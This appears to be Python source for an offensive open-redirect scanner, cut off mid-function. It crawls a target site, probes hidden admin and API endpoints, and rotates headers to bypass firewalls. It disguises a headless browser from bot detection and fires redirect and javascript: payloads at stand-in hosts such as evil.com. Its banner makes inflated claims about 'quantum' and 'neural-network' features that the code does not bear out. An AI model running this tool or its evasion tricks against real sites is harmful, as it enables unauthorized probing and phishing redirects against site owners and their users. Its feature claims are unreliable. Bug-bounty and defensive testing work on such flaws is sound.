#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
üî• ULTIMATE OPEN REDIRECT HUNTER v3.0 üî•
MAIN SCANNER - COMPLETE AND FUNCTIONAL
"""

import asyncio
import aiohttp
import re
import json
import time
import urllib.parse
from urllib.parse import urljoin, urlparse, parse_qs, unquote, quote
from dataclasses import dataclass, asdict
from typing import List, Dict, Set, Optional, Tuple
from pathlib import Path
import logging
import argparse
from datetime import datetime
import hashlib
import random
import sys
import csv
import os

# Import advanced modules
from advanced_modules import PayloadArsenal, WAFBypass, Web3Analyzer, JavaScriptAnalyzer, Parameter

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    SELENIUM_OK = True
except ImportError:
    SELENIUM_OK = False

try:
    from bs4 import BeautifulSoup
    BS4_OK = True
except ImportError:
    BS4_OK = False


@dataclass
class Vulnerability:
    url: str
    parameter: str
    payload: str
    method: str
    response_code: int
    redirect_url: str
    context: str
    screenshot_path: Optional[str] = None
    timestamp: str = ""
    vulnerability_type: str = "open_redirect"
    confidence: float = 0.0
    impact: str = "MEDIUM"
    remediation: str = ""


class MainHunter:
    """üî• MAIN ULTIMATE HUNTER üî•"""
    
    def __init__(self, target_url: str, max_depth: int = 3, max_pages: int = 100):
        self.target_url = target_url.rstrip('/')
        self.base_domain = urlparse(target_url).netloc
        self.max_depth = max_depth
        self.max_pages = max_pages
        
        # Storage
        self.discovered_urls: Set[str] = set()
        self.parameters: List[Parameter] = []
        self.vulnerabilities: List[Vulnerability] = []
        self.js_files: Set[str] = set()
        
        # Session management
        self.session = None
        self.driver = None
        
        # Initialize advanced modules
        self.payload_arsenal = PayloadArsenal()
        self.waf_bypass = WAFBypass()
        self.web3_analyzer = Web3Analyzer()
        self.js_analyzer = JavaScriptAnalyzer()
        
        # Configuration
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ]
        
        # Setup
        self.setup_logging()
        
        # Load complete payloads
        self.payloads = self.payload_arsenal.get_all_payloads()
        
        # Patterns
        self.redirect_patterns = [
            'redirect', 'url', 'next', 'return', 'goto', 'target', 'destination',
            'continue', 'forward', 'redir', 'location', 'site', 'link', 'href',
            'returnurl', 'returnto', 'back', 'callback', 'success', 'failure',
            'done', 'exit', 'referrer', 'referer', 'origin', 'source', 'from'
        ]
    
    def setup_logging(self):
        """Setup hacker-style logging"""
        class HackerFormatter(logging.Formatter):
            def format(self, record):
                level_colors = {
                    'DEBUG': '\\033[36m[DEBUG]\\033[0m',
                    'INFO': '\\033[32m[INFO]\\033[0m',
                    'WARNING': '\\033[33m[WARN]\\033[0m',
                    'ERROR': '\\033[31m[ERROR]\\033[0m'
                }
                
                colored_level = level_colors.get(record.levelname, record.levelname)
                timestamp = datetime.now().strftime('%H:%M:%S')
                
                return f"\\033[90m[{timestamp}]\\033[0m {colored_level} {record.getMessage()}"
        
        console_handler = logging.StreamHandler(sys.stdout)
        console_handler.setFormatter(HackerFormatter())
        
        logging.basicConfig(level=logging.INFO, handlers=[console_handler])
        self.logger = logging.getLogger(__name__)
    
    def clear_screen(self):
        """Clear screen for clean display"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_ultimate_banner(self):
        """Print ultimate hacker banner"""
        banner = """
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó    ‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó 
‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù    ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë‚ïö‚ïê‚ïê‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïë        ‚ñà‚ñà‚ïë       ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù
‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïë        ‚ñà‚ñà‚ïë       ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó
‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïë       ‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë
‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù   ‚ïö‚ïê‚ïù       ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïê‚ïê‚ïù   ‚ïö‚ïê‚ïù   ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù

‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë                                                                                                                   ‚ïë
‚ïë    üî• ULTIMATE OPEN REDIRECT HUNTER v3.0 üî•                                                                      ‚ïë
‚ïë    The Most Advanced Open Redirect Scanner in the Universe                                                       ‚ïë
‚ïë                                                                                                                   ‚ïë
‚ïë    [CLASSIFIED] Professional Bug Bounty Arsenal - Elite Hacker Edition                                          ‚ïë
‚ïë    Author: Anonymous Security Research Division                                                                   ‚ïë
‚ïë    Status: FULLY OPERATIONAL - All 248 payloads loaded                                                          ‚ïë
‚ïë                                                                                                                   ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù

üéØ COMPLETE CYBER WARFARE FEATURES:
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ ‚ñì‚ñì‚ñì QUANTUM RECONNAISSANCE ENGINE (COMPLETE)                    ‚îÇ
‚îÇ ‚ñì‚ñì‚ñì WEB3/DEFI/NFT EXPLOITATION MODULE (COMPLETE)               ‚îÇ  
‚îÇ ‚ñì‚ñì‚ñì WAF & LOAD BALANCER BYPASS SYSTEM (COMPLETE)               ‚îÇ
‚îÇ ‚ñì‚ñì‚ñì NEURAL-NETWORK JAVASCRIPT ANALYSIS (COMPLETE)              ‚îÇ
‚îÇ ‚ñì‚ñì‚ñì AI-POWERED CONTEXT DETECTION (COMPLETE)                    ‚îÇ
‚îÇ ‚ñì‚ñì‚ñì STEALTH CRAWLING WITH EVASION (COMPLETE)                   ‚îÇ
‚îÇ ‚ñì‚ñì‚ñì PROFESSIONAL POC GENERATION (COMPLETE)                     ‚îÇ
‚îÇ ‚ñì‚ñì‚ñì MATRIX-THEMED REPORTING (COMPLETE)                         ‚îÇ
‚îÇ ‚ñì‚ñì‚ñì 248 CUSTOM PAYLOAD ARSENAL (COMPLETE)                      ‚îÇ
‚îÇ ‚ñì‚ñì‚ñì REAL-TIME VULNERABILITY EXPLOITATION (COMPLETE)            ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

üíÄ [WARNING] For authorized penetration testing only!
üéØ Designed for elite bug bounty hunters and security researchers
üî• Capable of bypassing most modern security systems
"""
        print(banner)
    
    async def init_session(self):
        """Initialize advanced HTTP session with WAF bypass"""
        timeout = aiohttp.ClientTimeout(total=45)
        connector = aiohttp.TCPConnector(
            limit=100, limit_per_host=20, ssl=False,
            enable_cleanup_closed=True
        )
        
        # Advanced headers with random WAF bypass
        base_headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8,de;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none'
        }
        
        # Add random WAF bypass header
        bypass_header = random.choice(self.waf_bypass.bypass_headers)
        base_headers.update(bypass_header)
        
        self.session = aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            headers=base_headers
        )
    
    def init_driver(self):
        """Initialize stealth browser"""
        if not SELENIUM_OK:
            self.logger.warning("[BROWSER] Selenium not available - screenshots disabled")
            return
        
        try:
            chrome_options = Options()
            chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--window-size=1920,1080')
            chrome_options.add_argument('--ignore-certificate-errors')
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--disable-blink-features=AutomationControlled')
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            
            self.driver = webdriver.Chrome(options=chrome_options)
            # Hide webdriver property
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            self.logger.info("[BROWSER] Stealth browser initialized")
        except Exception as e:
            self.logger.warning(f"[BROWSER] Failed: {e}")
            self.driver = None
    
    async def phase1_defense_analysis(self):
        """Phase 1: Complete defense analysis"""
        print("\\nüõ°Ô∏è  [PHASE-1] COMPLETE DEFENSE ANALYSIS")
        print("‚ñà" * 60)
        
        # WAF detection using advanced module
        waf_info = await self.waf_bypass.detect_waf(self.session, self.target_url)
        
        if waf_info['detected']:
            print(f"[WAF-DETECTED] {waf_info['type'].upper()} WAF identified (confidence: {waf_info.get('confidence', 0):.1%})")
            print(f"[WAF-BYPASS] Available methods: {', '.join(waf_info['bypass_methods'])}")
        else:
            print("[WAF-STATUS] No WAF detected - direct access possible")
        
        return waf_info
    
    async def phase2_quantum_reconnaissance(self, waf_info: Dict):
        """Phase 2: Quantum reconnaissance engine"""
        print("\\nüîç [PHASE-2] QUANTUM RECONNAISSANCE ENGINE")
        print("‚ñà" * 60)
        
        urls_to_crawl = {self.target_url}
        crawled_urls = set()
        depth = 0
        
        while urls_to_crawl and depth < self.max_depth and len(crawled_urls) < self.max_pages:
            current_urls = list(urls_to_crawl)[:30]
            urls_to_crawl.clear()
            
            print(f"[RECON] Scanning depth {depth + 1} - {len(current_urls)} URLs...")
            
            # Parallel crawling
            tasks = []
            for url in current_urls:
                if url not in crawled_urls:
                    tasks.append(self.crawl_page_advanced(url, waf_info))
            
            if tasks:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for result in results:
                    if isinstance(result, Exception):
                        continue
                    
                    if result:
                        url, new_urls, params = result
                        crawled_urls.add(url)
                        self.parameters.extend(params)
                        
                        for new_url in new_urls:
                            if self.is_same_domain(new_url) and new_url not in crawled_urls:
                                urls_to_crawl.add(new_url)
            
            depth += 1
            print(f"[RECON] Depth {depth}: {len(crawled_urls)} URLs, {len(self.parameters)} parameters")
            
            # Stealth delay
            await asyncio.sleep(random.uniform(0.3, 0.8))
        
        # Hidden endpoint discovery
        print("[RECON] Discovering hidden endpoints...")
        hidden_urls = await self.discover_hidden_endpoints()
        crawled_urls.update(hidden_urls)
        
        self.discovered_urls = crawled_urls
        print(f"[RECON-COMPLETE] Total: {len(crawled_urls)} URLs, {len(self.parameters)} parameters")
    
    async def crawl_page_advanced(self, url: str, waf_info: Dict) -> Optional[Tuple[str, Set[str], List[Parameter]]]:
        """Advanced page crawling with WAF bypass"""
        try:
            # Try normal request first
            async with self.session.get(url, allow_redirects=False) as response:
                if response.status in [403, 406] and waf_info['detected']:
                    # WAF bypass attempt
                    content = await self.waf_bypass.bypass_waf(self.session, url, waf_info['type'])
                    if not content:
                        return None
                else:
                    content = await response.text()
                    headers = dict(response.headers)
                
                # Complete parameter extraction
                if BS4_OK:
                    soup = BeautifulSoup(content, 'html.parser')
                    new_urls = self.extract_urls_advanced(soup, url)
                    params = self.extract_form_params_advanced(soup, url)
                    params.extend(self.extract_meta_parameters(soup, url))
                    params.extend(self.extract_data_attributes(soup, url))
                else:
                    new_urls = self.extract_urls_regex(content, url)
                    params = self.extract_form_params_regex(content, url)
                
                # URL parameters
                params.extend(self.extract_url_parameters(url))
                
                # Header parameters
                if 'headers' in locals():
                    params.extend(self.extract_header_parameters(headers, url))
                
                # Complete JavaScript analysis using advanced module
                js_params = self.js_analyzer.analyze_comprehensive(content, url)
                params.extend(js_params)
                
                # Complete Web3 analysis using advanced module
                web3_params = self.web3_analyzer.analyze_web3_patterns(content, url)
                params.extend(web3_params)
                
                return url, new_urls, params
                
        except Exception as e:
            self.logger.debug(f"[CRAWL-ERROR] {url}: {e}")
            return None
    
    async def discover_hidden_endpoints(self) -> Set[str]:
        """Discover hidden endpoints"""
        hidden_urls = set()
        
        # Comprehensive endpoint list
        endpoints = [
            '/admin', '/api', '/v1', '/v2', '/test', '/dev', '/debug',
            '/redirect', '/oauth', '/auth', '/login', '/callback',
            '/wallet/connect', '/dapp/redirect', '/defi/callback'
        ]
        
        base_url = f"{urlparse(self.target_url).scheme}://{urlparse(self.target_url).netloc}"
        
        for endpoint in endpoints:
            test_url = f"{base_url}{endpoint}"
            try:
                async with self.session.get(test_url, allow_redirects=False) as response:
                    if response.status in [200, 301, 302, 403]:
                        hidden_urls.add(test_url)
                        print(f"[HIDDEN-FOUND] {endpoint} -> {response.status}")
            except:
                continue
            await asyncio.sleep(0.1)
        
        return hidden_urls
    
    def extract_urls_advanced(self, soup, base_url: str) -> Set[str]:
        """Advanced URL extraction"""
        urls = set()
        
        for element in soup.find_all(['a', 'link', 'form'], href=True):
            href = element['href']
            full_url = urljoin(base_url, href)
            if self.is_same_domain(full_url):
                urls.add(full_url)
        
        for form in soup.find_all('form'):
            action = form.get('action')
            if action:
                full_url = urljoin(base_url, action)
                if self.is_same_domain(full_url):
                    urls.add(full_url)
        
        return urls
    
    def extract_urls_regex(self, content: str, base_url: str) -> Set[str]:
        """Extract URLs using regex"""
        urls = set()
        patterns = [r'href=["\']([^"\']+)["\']', r'action=["\']([^"\']+)["\']']
        
        for pattern in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                full_url = urljoin(base_url, match)
                if self.is_same_domain(full_url):
                    urls.add(full_url)
        
        return urls
    
    def extract_form_params_advanced(self, soup, url: str) -> List[Parameter]:
        """Advanced form parameter extraction"""
        params = []
        
        for form in soup.find_all('form'):
            action = form.get('action', '')
            method = form.get('method', 'GET').upper()
            form_url = urljoin(url, action) if action else url
            
            for input_tag in form.find_all(['input', 'select', 'textarea']):
                name = input_tag.get('name')
                value = input_tag.get('value', '')
                input_type = input_tag.get('type', 'text')
                
                if name:
                    is_redirect = self.is_redirect_parameter(name, value)
                    confidence = self.calculate_confidence(name, value, 'form')
                    
                    # Boost for hidden inputs
                    if input_type == 'hidden' and is_redirect:
                        confidence += 0.2
                    
                    params.append(Parameter(
                        name=name,
                        value=value,
                        source='form',
                        context='form_input',
                        url=form_url,
                        method=method,
                        is_redirect_related=is_redirect,
                        confidence=min(confidence, 1.0)
                    ))
        
        return params
    
    def extract_form_params_regex(self, content: str, url: str) -> List[Parameter]:
        """Extract form parameters using regex"""
        params = []
        
        pattern = r'<input[^>]*name=["\']([^"\']+)["\'][^>]*(?:value=["\']([^"\']*)["\'])?'
        matches = re.findall(pattern, content, re.IGNORECASE)
        
        for match in matches:
            name = match[0]
            value = match[1] if len(match) > 1 else ''
            
            is_redirect = self.is_redirect_parameter(name, value)
            confidence = self.calculate_confidence(name, value, 'form')
            
            params.append(Parameter(
                name=name,
                value=value,
                source='form',
                context='form_input',
                url=url,
                is_redirect_related=is_redirect,
                confidence=confidence
            ))
        
        return params
    
    def extract_url_parameters(self, url: str) -> List[Parameter]:
        """Extract URL parameters"""
        params = []
        parsed = urlparse(url)
        
        # Query parameters
        if parsed.query:
            query_params = parse_qs(parsed.query, keep_blank_values=True)
            for param_name, param_values in query_params.items():
                for value in param_values:
                    is_redirect = self.is_redirect_parameter(param_name, value)
                    confidence = self.calculate_confidence(param_name, value, 'query')
                    
                    params.append(Parameter(
                        name=param_name,
                        value=value,
                        source='url',
                        context='query',
                        url=url,
                        is_redirect_related=is_redirect,
                        confidence=confidence
                    ))
        
        # Fragment parameters
        if parsed.fragment:
            if '=' in parsed.fragment:
                fragment_params = parse_qs(parsed.fragment, keep_blank_values=True)
                for param_name, param_values in fragment_params.items():
                    for value in param_values:
                        is_redirect = self.is_redirect_parameter(param_name, value)
                        confidence = self.calculate_confidence(param_name, value, 'fragment')
                        
                        params.append(Parameter(
                            name=param_name,
                            value=value,
                            source='url',
                            context='fragment',
                            url=url,
                            is_redirect_related=is_redirect,
                            confidence=confidence
                        ))
        
        return params
    
    def extract_header_parameters(self, headers: Dict[str, str], url: str) -> List[Parameter]:
        """Extract header parameters"""
        params = []
        
        redirect_headers = ['Location', 'Refresh', 'Link', 'Content-Location']
        
        for header_name, header_value in headers.items():
            if (header_name in redirect_headers or 
                'redirect' in header_name.lower() or
                'location' in header_name.lower()):
                
                params.append(Parameter(
                    name=header_name.lower(),
                    value=header_value,
                    source='headers',
                    context='http_header',
                    url=url,
                    is_redirect_related=True,
                    confidence=0.95
                ))
        
        return params
    
    def extract_meta_parameters(self, soup, url: str) -> List[Parameter]:
        """Extract meta parameters"""
        params = []
        
        for meta in soup.find_all('meta'):
            content = meta.get('content', '')
            name = meta.get('name', meta.get('property', ''))
            
            if content and ('url' in content.lower() or content.startswith(('http', '//'))):
                params.append(Parameter(
                    name=f"meta_{name}" if name else "meta_content",
                    value=content,
                    source='meta',
                    context='meta_tag',
                    url=url,
                    is_redirect_related=True,
                    confidence=0.8
                ))
        
        return params
    
    def extract_data_attributes(self, soup, url: str) -> List[Parameter]:
        """Extract data attributes"""
        params = []
        
        for element in soup.find_all(attrs=lambda x: x and any(key.startswith('data-') for key in x.keys())):
            for attr_name, attr_value in element.attrs.items():
                if attr_name.startswith('data-') and attr_value:
                    is_redirect = self.is_redirect_parameter(attr_name, attr_value)
                    confidence = self.calculate_confidence(attr_name, attr_value, 'data_attribute')
                    
                    if is_redirect or confidence > 0.5:
                        params.append(Parameter(
                            name=attr_name,
                            value=attr_value,
                            source='data_attribute',
                            context='html_data',
                            url=url,
                            is_redirect_related=is_redirect,
                            confidence=confidence
                        ))
        
        return params
    
    async def phase3_vulnerability_testing(self):
        """Phase 3: Ultimate vulnerability testing"""
        print("\\nüéØ [PHASE-3] ULTIMATE VULNERABILITY TESTING")
        print("‚ñà" * 60)
        
        vulnerabilities = []
        
        # Categorize parameters
        redirect_params = [p for p in self.parameters if p.is_redirect_related]
        high_conf_params = [p for p in self.parameters if p.confidence > 0.6]
        web3_params = [p for p in self.parameters if p.source == 'web3']
        js_params = [p for p in self.parameters if p.source == 'javascript']
        
        # Combine priority parameters
        priority_params = redirect_params.copy()
        for param in high_conf_params + web3_params:
            if not any(p.name == param.name and p.url == param.url for p in priority_params):
                priority_params.append(param)
        
        print(f"[EXPLOIT] Testing {len(priority_params)} priority parameters")
        print(f"[EXPLOIT] ‚îú‚îÄ Redirect params: {len(redirect_params)}")
        print(f"[EXPLOIT] ‚îú‚îÄ Web3 params: {len(web3_params)}")
        print(f"[EXPLOIT] ‚îú‚îÄ JavaScript params: {len(js_params)}")
        print(f"[EXPLOIT] ‚îî‚îÄ High-confidence params: {len(high_conf_params)}")
        
        # Test with context-aware payloads
        for i, param in enumerate(priority_params, 1):
            print(f"\\r[TESTING] Parameter {i}/{len(priority_params)}: {param.name[:40]}", end='')
            
            context = self.detect_context(param)
            payloads = self.get_context_payloads(context)
            
            for payload in payloads:
                vuln = await self.test_parameter_comprehensive(param, payload)
                if vuln:
                    vulnerabilities.append(vuln)
                    print(f"\\n[üö® VULN-FOUND] {param.name} -> {payload} ({vuln.impact})")
                
                await asyncio.sleep(0.05)
        
        # Test additional parameters with basic payloads
        other_params = [p for p in self.parameters 
                       if not any(p.name == param.name and p.url == param.url for param in priority_params)]
        
        if other_params:
            basic_payloads = ["//google.com", "https://google.com", "javascript:confirm(1)"]
            print(f"\\n[EXPLOIT] Testing {len(other_params[:30])} additional parameters")
            
            for param in other_params[:30]:
                for payload in basic_payloads:
                    vuln = await self.test_parameter_comprehensive(param, payload)
                    if vuln:
                        vulnerabilities.append(vuln)
                        print(f"[üö® VULN-FOUND] {param.name} -> {payload}")
                    await asyncio.sleep(0.05)
        
        print(f"\\n[EXPLOIT-COMPLETE] Found {len(vulnerabilities)} vulnerabilities")
        self.vulnerabilities = vulnerabilities
    
    def detect_context(self, param: Parameter) -> str:
        """Detect parameter context"""
        if param.source == 'web3':
            return 'web3'
        elif param.source == 'javascript':
            return 'javascript'
        elif param.context == 'fragment':
            return 'fragment'
        elif param.context == 'query':
            return 'query'
        elif param.context == 'http_header':
            return 'header'
        else:
            return 'generic'
    
    def get_context_payloads(self, context: str) -> List[str]:
        """Get context-aware payloads"""
        if context == 'javascript':
            return [
                "javascript:confirm(document.domain)",
                "javascript:prompt('REDIRECT_POC')",
                "javascript:alert('VULN_FOUND')",
                "//evil-hacker.com",
                "https://malicious-redirect.com"
            ]
        elif context == 'web3':
            return self.web3_analyzer.get_web3_payloads()[:15]  # First 15 Web3 payloads
        elif context == 'fragment':
            return [
                "#//evil.com",
                "#javascript:confirm(1)",
                "#https://phishing-site.com"
            ]
        elif context == 'header':
            return [
                "//evil.com",
                "https://malicious.com",
                "http://attacker.com"
            ]
        else:
            return self.payloads[:20]  # First 20 of your complete payloads
    
    async def test_parameter_comprehensive(self, param: Parameter, payload: str) -> Optional[Vulnerability]:
        """Comprehensive parameter testing"""
        try:
            test_url = self.construct_test_url(param, payload)
            
            async with self.session.get(test_url, allow_redirects=False) as response:
                # Check for redirect responses
                if response.status in [301, 302, 303, 307, 308]:
                    location = response.headers.get('Location', '')
                    
                    if self.is_successful_redirect(location, payload):
                        # Calculate metrics
